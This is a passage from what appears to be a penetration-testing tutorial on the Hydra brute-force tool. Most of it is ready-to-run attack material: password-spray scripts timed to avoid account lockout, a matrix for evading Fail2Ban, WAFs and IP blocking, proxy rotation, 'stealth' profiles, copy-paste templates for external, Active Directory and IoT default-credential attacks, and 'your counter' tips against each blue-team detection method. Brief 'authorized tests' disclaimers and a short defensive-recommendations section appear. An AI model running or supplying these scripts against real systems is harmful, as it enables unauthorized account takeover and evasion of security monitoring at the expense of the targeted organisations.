# Step 3: Password spray with Hydra (staying under lockout)
hydra -L valid_users.txt -P spray_list.txt \
  -t 1 -W 60 -u -f -e nsr \
  smb://192.168.1.10
```

## Rate Limiting & Evasion Strategies

::note
Modern systems implement rate limiting, account lockout, CAPTCHA, and IP blocking to defend against brute force. Here is how to deal with each — **ethically and during authorized tests**.
::

### Evasion Techniques Matrix

| Defense Mechanism       | Detection Method                     | Evasion Strategy                                |
| ----------------------- | ------------------------------------ | ----------------------------------------------- |
| Fail2Ban                | X failed attempts in Y seconds       | `-t 1 -W 10 -c 10` slow and steady             |
| Account Lockout         | X failures per account               | `-u` flag + small password list (spray)          |
| IP Blocking             | Too many connections from one IP     | Rotate through proxies                          |
| CAPTCHA                 | Triggered after N failures           | Cannot bypass with Hydra — use other tools       |
| WAF (Web App Firewall)  | Pattern detection on requests        | Randomize User-Agent, add jitter with `-W`       |
| Rate Limiting (API)     | Requests per minute/hour limit       | `-c` flag to enforce per-attempt delay           |
| Geographic Blocking     | Block non-local IP ranges            | Use proxy in allowed geography                   |
| MFA / 2FA               | Second factor required               | Cannot bypass with Hydra — game over :icon{name="i-lucide-shield-check"} |

### Slow and Stealthy Attack Profile

```bash [stealth_attack.sh]
#!/bin/bash
# Stealth brute force profile
# Designed to stay under most detection thresholds

TARGET="192.168.1.100"
SERVICE="ssh"
USERS="users.txt"
PASSWORDS="top100.txt"

hydra \
  -L "$USERS" \
  -P "$PASSWORDS" \
  -t 1 \
  -W 15 \
  -c 30 \
  -u \
  -f \
  -e nsr \
  -o "results_${TARGET}.json" \
  -b jsonv \
  -q \
  "${SERVICE}://${TARGET}"
```

::field-group
  ::field{name="-t 1" type="stealth"}
  Single thread. One connection at a time. Minimal noise.
  ::

  ::field{name="-W 15" type="stealth"}
  15-second wait between connections in each thread.
  ::

  ::field{name="-c 30" type="stealth"}
  30-second wait per login attempt across all threads. Enforces `-t 1`.
  ::

  ::field{name="-u" type="stealth"}
  Distribute attempts across users. Avoids per-account lockout.
  ::

  ::field{name="-q" type="stealth"}
  Quiet mode. Suppress error messages in output.
  ::
::

### IP Rotation with Proxychains

```ini [/etc/proxychains4.conf]
# Rotate through multiple proxies
random_chain
chain_len = 1
proxy_dns

[ProxyList]
socks5 proxy1.example.com 1080
socks5 proxy2.example.com 1080
socks5 proxy3.example.com 1080
socks4 proxy4.example.com 1080
http proxy5.example.com 8080
```

```bash [Terminal]
proxychains hydra -l admin -P wordlist.txt \
  -t 1 -W 10 -f \
  ssh://192.168.1.100
```

## Practical Attack Scenarios

### Scenario 1 — Compromising a Web Application

::steps{level="4"}

#### Reconnaissance

```bash [Terminal]
# Find the login page
dirb https://target.com /usr/share/seclists/Discovery/Web-Content/common.txt

# Enumerate usernames via registration/forgot password
# Check for username enumeration in error messages
curl -X POST https://target.com/login \
  -d "user=admin&pass=wrong" -v 2>&1 | grep -i "invalid\|incorrect\|not found"
```

#### Determine Failure Condition

```bash [Terminal]
# Failed login response
curl -s -X POST https://target.com/login \
  -d "username=admin&password=wrongpassword" | grep -oP '(?<=class="error">).*?(?=<)'

# Output: "Invalid username or password"
```

#### Build and Execute Attack

```bash [Terminal]
hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
  target.com \
  https-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid username or password" \
  -t 10 -f -V -e nsr \
  -o web_results.json -b jsonv
```

#### Verify and Document

```bash [Terminal]
cat web_results.json | jq '.'
# Take screenshots, document the finding
```

::

### Scenario 2 — Internal Network Password Spray

::steps{level="4"}

#### Enumerate Domain Password Policy

```bash [Terminal]
crackmapexec smb 10.10.10.10 --pass-pol
```

::code-collapse
```text [Sample Output]
SMB         10.10.10.10     445    DC01       [*] Windows Server 2019 Build 17763 x64
SMB         10.10.10.10     445    DC01       [+] Dumping password info for domain: CORP
SMB         10.10.10.10     445    DC01       Minimum password length: 8
SMB         10.10.10.10     445    DC01       Password history length: 24
SMB         10.10.10.10     445    DC01       Maximum password age: 90 days
SMB         10.10.10.10     445    DC01       Password Complexity Flags: 000001
SMB         10.10.10.10     445    DC01           DOMAIN_PASSWORD_COMPLEX
SMB         10.10.10.10     445    DC01       Minimum password age: 1 day
SMB         10.10.10.10     445    DC01       Reset Account Lockout Counter: 30 min
SMB         10.10.10.10     445    DC01       Locked Account Duration: 30 min
SMB         10.10.10.10     445    DC01       Account Lockout Threshold: 5
SMB         10.10.10.10     445    DC01       Forced Logoff Time: Not Set
```
::

#### Calculate Safe Attack Parameters

| Policy Setting                   | Value    | Our Strategy                          |
| -------------------------------- | -------- | ------------------------------------- |
| Lockout Threshold                | 5        | Max 3 attempts per user per window    |
| Lockout Window                   | 30 min   | Wait 35 min between spray rounds      |
| Complexity Required              | Yes      | Spray complex passwords               |
| Min Length                       | 8        | 8+ char passwords only                |

#### Spray — Round 1

```bash [Terminal]
hydra -L domain_users.txt -p 'Summer2024!' \
  -t 1 -W 5 -u -f -e nsr \
  smb://10.10.10.10
```

#### Wait for Lockout Window

```bash [Terminal]
echo "Round 1 complete at $(date). Sleeping 35 minutes..."
sleep 2100
echo "Resuming at $(date)"
```

#### Spray — Round 2

```bash [Terminal]
hydra -L domain_users.txt -p 'Welcome2024!' \
  -t 1 -W 5 -u -f -e nsr \
  smb://10.10.10.10
```

#### Automate Multi-Round Spraying

```bash [spray_schedule.sh]
#!/bin/bash

TARGETS="10.10.10.10"
USERS="domain_users.txt"
PASSWORDS=("Summer2024!" "Welcome2024!" "Company2024!" "P@ssw0rd1!" "Changeme1!")
WAIT=2100  # 35 minutes

for i in "${!PASSWORDS[@]}"; do
    PASS="${PASSWORDS[$i]}"
    ROUND=$((i + 1))
    
    echo "[*] Round ${ROUND}/${#PASSWORDS[@]} — Spraying: ${PASS}"
    echo "[*] Started at: $(date)"
    
    hydra -L "$USERS" -p "$PASS" \
        -t 1 -W 5 -u -f -e nsr \
        -o "spray_round_${ROUND}.json" -b jsonv \
        "smb://${TARGETS}"
    
    if [ $ROUND -lt ${#PASSWORDS[@]} ]; then
        echo "[*] Sleeping ${WAIT} seconds until next round..."
        sleep $WAIT
    fi
done

echo "[+] All rounds complete. Check spray_round_*.json for results."
```

::

### Scenario 3 — IoT Device Default Credentials

::note
IoT devices frequently ship with default credentials. Before using a wordlist, try the manufacturer's defaults.
::

```text [iot_defaults.txt]
admin:admin
admin:password
admin:1234
root:root
root:toor
user:user
admin:
root:
ubnt:ubnt
pi:raspberry
```

```bash [Terminal]
# Scan for Telnet-enabled IoT devices
nmap -sV -p 23,80,443,8080 192.168.1.0/24 -oG iot_scan.txt
grep "23/open" iot_scan.txt | awk '{print $2}' > iot_targets.txt

# Spray defaults
hydra -C iot_defaults.txt \
  -M iot_targets.txt \
  -t 4 -T 32 -f -V \
  telnet
```

::tip
Create protocol-specific target lists. Not every device runs every protocol. Spraying HTTP creds at a Telnet-only device wastes time and generates noise.
::

## Hydra vs Other Tools

| Feature                    | Hydra          | Medusa         | Ncrack         | Patator        | CrackMapExec   |
| -------------------------- | -------------- | -------------- | -------------- | -------------- | -------------- |
| Protocols supported        | 50+            | ~20            | ~10            | Modular        | SMB/WinRM/SSH  |
| Speed                      | Fast           | Fast           | Fast           | Moderate       | Fast           |
| HTTP form support          | Excellent      | Basic          | None           | Excellent      | None           |
| Combo list support         | Yes (`-C`)     | Yes (`-C`)     | No             | Yes            | Yes            |
| Resume support             | Yes (`-R`)     | Yes            | Yes            | No             | No             |
| JSON output                | Yes            | No             | No             | No             | Yes            |
| Active Directory aware     | Basic          | Basic          | Basic          | Basic          | Excellent      |
| Password spraying          | Manual (`-u`)  | No             | No             | Manual         | Built-in       |
| Built-in evasion           | Timing flags   | Limited        | Limited        | Excellent      | Limited        |
| Learning curve             | Low            | Low            | Low            | High           | Low            |

::tip
**When to use what:**
- **Hydra** — general purpose, most protocols, web forms
- **CrackMapExec** — Active Directory environments, SMB, WinRM
- **Patator** — when you need maximum customization and scripting
- **Ncrack** — Nmap integration, simple syntax
- **Medusa** — stable alternative when Hydra acts up
::

## Defense & Detection

::note
Understanding defense helps you test more effectively. If you know what blue teams look for, you can simulate realistic attacks — and write better remediation recommendations in your reports.
::

### How Blue Teams Detect Hydra

::accordion
  :::accordion-item{icon="i-lucide-shield" label="Log-Based Detection"}
  **SSH** — `/var/log/auth.log`:

  ```text [auth.log]
  Jun 15 14:23:01 server sshd[1234]: Failed password for admin from 192.168.1.50 port 45678 ssh2
  Jun 15 14:23:02 server sshd[1234]: Failed password for admin from 192.168.1.50 port 45679 ssh2
  Jun 15 14:23:03 server sshd[1234]: Failed password for admin from 192.168.1.50 port 45680 ssh2
  ```

  **Detection rule:** More than 5 failed logins from the same IP within 60 seconds.

  **Your counter:** Use `-t 1 -W 15 -c 30` to stay under this threshold.
  :::

  :::accordion-item{icon="i-lucide-shield" label="Network-Based Detection (IDS/IPS)"}
  Snort/Suricata rules look for:
  - Rapid sequential connections to authentication ports
  - Hydra's default User-Agent string in HTTP attacks
  - High volume of failed authentication responses

  **Your counter:**
  - Custom User-Agent: `H=User-Agent\: Mozilla/5.0 (Windows NT 10.0; Win64; x64)`
  - Slow timing
  - Proxy rotation
  :::

  :::accordion-item{icon="i-lucide-shield" label="SIEM Correlation"}
  Security teams correlate:
  - Same source IP → multiple usernames → authentication service
  - Same username → multiple source IPs (distributed spray detection)
  - Time-of-day anomalies (attacks at 3 AM)

  **Your counter:** Attack during business hours, use realistic timing patterns.
  :::

  :::accordion-item{icon="i-lucide-shield" label="Windows Event Logs"}
  | Event ID | Description                          |
  | -------- | ------------------------------------ |
  | 4625     | Failed logon                         |
  | 4624     | Successful logon                     |
  | 4740     | Account locked out                   |
  | 4771     | Kerberos pre-authentication failed   |

  Blue teams alert on high volumes of 4625 events followed by a 4624 from the same source.
  :::
::

### Defensive Recommendations

Include these in your pentest reports when brute force succeeds:

::card-group
  ::card
  ---
  title: Implement Account Lockout
  icon: i-lucide-lock
  ---
  Configure lockout after 5 failed attempts for 30 minutes. Prevents automated attacks while allowing legitimate users to retry.
  ::

  ::card
  ---
  title: Deploy MFA / 2FA
  icon: i-lucide-smartphone
  ---
  Multi-factor authentication makes password-only brute force **completely ineffective**. This is the single best defense.
  ::

  ::card
  ---
  title: Use Fail2Ban / DenyHosts
  icon: i-lucide-shield-ban
  ---
  Automatically ban IPs after failed login attempts. Configure aggressive thresholds on internet-facing services.
  ::

  ::card
  ---
  title: Enforce Strong Password Policy
  icon: i-lucide-key-round
  ---
  Minimum 12 characters, complexity requirements, password history, and regular rotation. Block known-breached passwords.
  ::

  ::card
  ---
  title: Rate Limit Authentication
  icon: i-lucide-timer
  ---
  Implement progressive delays: 1s after 1st failure, 2s after 2nd, 4s after 3rd... exponential backoff makes brute force impractical.
  ::

  ::card
  ---
  title: Monitor & Alert
  icon: i-lucide-bell-ring
  ---
  Alert on multiple failed logins, successful login after failures, logins from unusual locations/times, and account lockout events.
  ::
::

## Troubleshooting

::accordion
  :::accordion-item{icon="i-lucide-circle-help" label="Hydra reports 0 valid passwords but I know the creds work"}
  **Common causes:**
  - Wrong failure string in HTTP form attacks
  - Service requires SSL but you did not use `-S`
  - Firewall or WAF blocking Hydra's requests
  - CSRF token changing on each request (Hydra cannot handle dynamic CSRF)

  **Fixes:**
  - Use `-d` (debug) to see raw responses
  - Verify the failure string manually with `curl`
  - Try `-S` for SSL services
  - For CSRF: use Burp Suite Intruder or custom scripts instead
  :::

  :::accordion-item{icon="i-lucide-circle-help" label="'Too many connections' or 'Connection refused' errors"}
  You are overwhelming the target.

  ```bash [Terminal]
  # Reduce threads and add delays
  hydra -l admin -P wordlist.txt \
    -t 1 -W 5 -c 10 \
    ssh://192.168.1.100
  ```

  Also check if the service is rate limiting or banning your IP.
  :::

  :::accordion-item{icon="i-lucide-circle-help" label="Hydra hangs or freezes mid-attack"}
  - Kill and restore: :kbd{value="Ctrl"} + :kbd{value="C"} then `hydra -R`
  - Reduce threads: `-t 1`
  - Increase timeout: `-w 30`
  - Some services have slow responses — Hydra waits and appears frozen
  :::

  :::accordion-item{icon="i-lucide-circle-help" label="HTTP form attack returns every password as valid"}
  Your failure string is wrong. Hydra thinks every response is a success because the failure text you specified does not appear in the response.

  ```bash [Terminal]
  # Debug: see what Hydra actually receives
  hydra -l admin -p test123 \
    192.168.1.100 \
    http-post-form \
    "/login:user=^USER^&pass=^PASS^:F=WRONG_STRING_HERE" \
    -d
  ```

  Look at the raw response in debug output and find the actual failure text.
  :::

  :::accordion-item{icon="i-lucide-circle-help" label="'Module X is not supported' error"}
  Your Hydra installation is missing dependencies for that module.

  ```bash [Terminal]
  # Reinstall with all dependencies
  sudo apt install libssh-dev libssl-dev libpq-dev \
    libmysqlclient-dev libsvn-dev firebird-dev \
    libidn11-dev libmemcached-dev libgcrypt20-dev -y

  # Rebuild from source
  cd thc-hydra
  ./configure
  make clean
  make
  sudo make install
  ```
  :::

  :::accordion-item{icon="i-lucide-circle-help" label="Attack is incredibly slow"}
  | Bottleneck                    | Fix                                               |
  | ----------------------------- | ------------------------------------------------- |
  | Large wordlist                | Trim to relevant passwords using rules             |
  | Too many threads              | Reduce `-t` — more threads ≠ faster               |
  | Network latency               | Use a VPS closer to the target                     |
  | Target rate limiting           | Accept the speed or use proxy rotation             |
  | Tor routing                   | Remove Tor — it adds 2-10 seconds per request       |
  | Wrong protocol module          | Verify service with Nmap first                     |
  :::
::

## Complete Attack Templates

Copy-paste ready templates for common engagements.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="External Pentest"}
  ```bash [external_brute.sh]
  #!/bin/bash
  # External perimeter brute force template
  # Targets: internet-facing services

  TARGET="target.com"
  USERS="users.txt"
  PASSWORDS="/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"
  OUTPUT_DIR="./results"

  mkdir -p "$OUTPUT_DIR"

  echo "[*] Starting external brute force against ${TARGET}"
  echo "[*] Timestamp: $(date -u)"

  # SSH
  echo "[*] Phase 1: SSH"
  hydra -L "$USERS" -P "$PASSWORDS" \
    -t 4 -W 5 -f -e nsr \
    -o "${OUTPUT_DIR}/ssh.json" -b jsonv \
    "ssh://${TARGET}"

  # FTP
  echo "[*] Phase 2: FTP"
  hydra -L "$USERS" -P "$PASSWORDS" \
    -t 10 -f -e nsr \
    -o "${OUTPUT_DIR}/ftp.json" -b jsonv \
    "ftp://${TARGET}"

  # Web Login
  echo "[*] Phase 3: Web Application"
  hydra -L "$USERS" -P "$PASSWORDS" \
    "${TARGET}" \
    https-post-form \
    "/login:username=^USER^&password=^PASS^:F=Invalid" \
    -t 10 -f -e nsr \
    -o "${OUTPUT_DIR}/web.json" -b jsonv

  echo "[+] Complete. Results in ${OUTPUT_DIR}/"
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Internal AD Spray"}
  ```bash [ad_spray.sh]
  #!/bin/bash
  # Active Directory password spray template
  # Safe against lockout policies

  DC="10.10.10.10"
  DOMAIN="CORP"
  USERS="domain_users.txt"
  LOCKOUT_WINDOW=2100  # 35 minutes (policy: 30 min + buffer)
  OUTPUT_DIR="./ad_results"

  SPRAY_LIST=(
    'Summer2024!'
    'Welcome2024!'
    'Company2024!'
    'Changeme1!'
    'P@ssw0rd!'
  )

  mkdir -p "$OUTPUT_DIR"

  echo "[*] AD Password Spray — ${DOMAIN}"
  echo "[*] Domain Controller: ${DC}"
  echo "[*] Users: $(wc -l < $USERS)"
  echo "[*] Passwords: ${#SPRAY_LIST[@]}"
  echo "[*] Lockout Window: ${LOCKOUT_WINDOW}s"

  for i in "${!SPRAY_LIST[@]}"; do
      PASS="${SPRAY_LIST[$i]}"
      ROUND=$((i + 1))

      echo ""
      echo "════════════════════════════════════════"
      echo "[*] Round ${ROUND}/${#SPRAY_LIST[@]}"
      echo "[*] Password: ${PASS}"
      echo "[*] Time: $(date)"
      echo "════════════════════════════════════════"

      hydra -L "$USERS" -p "$PASS" \
          -t 1 -W 5 -u -f -e nsr \
          -o "${OUTPUT_DIR}/round_${ROUND}.json" -b jsonv \
          "smb://${DC}"

      FOUND=$(cat "${OUTPUT_DIR}/round_${ROUND}.json" 2>/dev/null | \
              python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('quantityfound',0))" 2>/dev/null)

      if [ "$FOUND" -gt 0 ] 2>/dev/null; then
          echo "[+] CREDENTIALS FOUND IN ROUND ${ROUND}!"
          cat "${OUTPUT_DIR}/round_${ROUND}.json" | jq '.results[]'
      fi

      if [ $ROUND -lt ${#SPRAY_LIST[@]} ]; then
          echo "[*] Waiting ${LOCKOUT_WINDOW}s for lockout window..."
          sleep "$LOCKOUT_WINDOW"
      fi
  done

  echo ""
  echo "[+] Spray complete. Consolidating results..."
  cat "${OUTPUT_DIR}"/round_*.json | jq -s '[.[].results[]] | unique_by(.login)' > "${OUTPUT_DIR}/all_cracked.json"
  echo "[+] Results saved to ${OUTPUT_DIR}/all_cracked.json"
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="IoT Mass Scan"}
  ```bash [iot_scan.sh]
  #!/bin/bash
  # IoT default credential scanner
  # Targets: Telnet, SSH, HTTP on common IoT ports

  SUBNET="192.168.1.0/24"
  OUTPUT_DIR="./iot_results"

  mkdir -p "$OUTPUT_DIR"

  # Create default creds file
  cat > /tmp/iot_defaults.txt << 'EOF'
  admin:admin
  admin:password
  admin:1234
  admin:12345
  admin:123456
  root:root
  root:toor
  root:password
  user:user
  ubnt:ubnt
  pi:raspberry
  admin:
  root:
  EOF

  echo "[*] Phase 1: Discovering IoT devices on ${SUBNET}"
  nmap -sV -p 22,23,80,443,8080,8443 "$SUBNET" -oG "${OUTPUT_DIR}/scan.txt" --open

  echo "[*] Phase 2: Extracting targets per protocol"
  grep "22/open" "${OUTPUT_DIR}/scan.txt" | awk '{print $2}' > "${OUTPUT_DIR}/ssh_targets.txt"
  grep "23/open" "${OUTPUT_DIR}/scan.txt" | awk '{print $2}' > "${OUTPUT_DIR}/telnet_targets.txt"
  grep "80/open\|8080/open" "${OUTPUT_DIR}/scan.txt" | awk '{print $2}' | sort -u > "${OUTPUT_DIR}/http_targets.txt"

  echo "[*] Phase 3: Spraying defaults"

  if [ -s "${OUTPUT_DIR}/telnet_targets.txt" ]; then
      echo "[*] Spraying Telnet..."
      hydra -C /tmp/iot_defaults.txt \
          -M "${OUTPUT_DIR}/telnet_targets.txt" \
          -t 4 -T 32 -f -e nsr \
          -o "${OUTPUT_DIR}/telnet_cracked.json" -b jsonv \
          telnet
  fi

  if [ -s "${OUTPUT_DIR}/ssh_targets.txt" ]; then
      echo "[*] Spraying SSH..."
      hydra -C /tmp/iot_defaults.txt \
          -M "${OUTPUT_DIR}/ssh_targets.txt" \
          -t 4 -T 32 -f -e nsr \
          -o "${OUTPUT_DIR}/ssh_cracked.json" -b jsonv \
          ssh
  fi

  echo "[+] IoT scan complete. Check ${OUTPUT_DIR}/ for results."
  ```
  :::
::

## Quick Reference Card

::collapsible

| Task                             | Command                                                                         |
| -------------------------------- | ------------------------------------------------------------------------------- |
| Basic SSH attack                 | `hydra -l root -P wordlist.txt ssh://target`                                    |
| Basic FTP attack                 | `hydra -l admin -P wordlist.txt ftp://target`                                   |
| Basic RDP attack                 | `hydra -l admin -P wordlist.txt rdp://target`                                   |
| HTTP POST form                   | `hydra -l admin -P wl.txt target http-post-form "/login:u=^USER^&p=^PASS^:F=fail"` |
| HTTPS POST form                  | `hydra -l admin -P wl.txt -S target https-post-form "/login:u=^USER^&p=^PASS^:F=fail"` |
| HTTP Basic Auth                  | `hydra -l admin -P wl.txt http-get://target/admin/`                             |
| MySQL attack                     | `hydra -l root -P wl.txt mysql://target`                                        |
| Password spray                   | `hydra -L users.txt -p 'Pass123!' -u -t 1 smb://target`                        |
| Credential stuffing              | `hydra -C creds.txt ssh://target`                                               |
| Custom port                      | `hydra -l admin -P wl.txt -s 2222 ssh://target`                                |
| Multiple targets                 | `hydra -L users.txt -P wl.txt -M targets.txt ssh`                              |
| Generate passwords               | `hydra -l admin -x 4:6:aA1 ssh://target`                                       |
| SSL connection                   | `hydra -l admin -P wl.txt -S https://target`                                   |
| Try null/login/reverse           | Add `-e nsr` to any command                                                     |
| Resume crashed session           | `hydra -R`                                                                      |
| JSON output                      | Add `-o results.json -b jsonv`                                                  |
| Verbose (show all attempts)      | Add `-V`                                                                        |
| Debug mode                       | Add `-d`                                                                        |
| Stop on first found              | Add `-f` (per host) or `-F` (global)                                            |
| Stealth mode                     | Add `-t 1 -W 15 -c 30 -q`                                                      |
| Via proxy                        | `export HYDRA_PROXY=socks5://127.0.0.1:1080`                                   |
| Module help                      | `hydra -U ssh` (shows module-specific options)                                  |

::

::tip
Hydra is a precision instrument, not a sledgehammer. The best brute force attack is the one that **finds the credential in 10 attempts** because you did your homework on the target's password policy, user habits, and naming conventions. Speed means nothing if your wordlist is garbage.

Work smarter. Crack faster. Stay legal. :icon{name="i-lucide-zap"}
::